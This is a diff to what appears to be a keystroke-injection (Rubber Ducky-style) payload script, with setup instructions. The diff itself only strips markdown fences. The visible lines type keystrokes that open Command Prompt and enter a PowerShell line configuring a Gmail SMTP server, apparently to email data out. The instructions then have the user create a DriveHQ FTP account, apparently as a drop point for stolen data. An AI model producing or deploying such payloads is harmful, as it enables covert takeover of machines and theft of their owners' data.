@@ -1,4 +1,4 @@
-```DELAY 800
+DELAY 800
 GUI
 DELAY 800
 STRING Command Prompt
@@ -52,7 +52,7 @@ STRING $emailSmtpServer = "smtp.gmail.com";$emailSmtpServerPort = "587";$emailSm
 ENTER
 DELAY 5000
 STRING exit
-ENTER```
+ENTER
 
 # Instructions:
 1. Create an free account at [https://www.drivehq.com/features/ftp.aspx](https://www.drivehq.com/features/ftp.aspx)
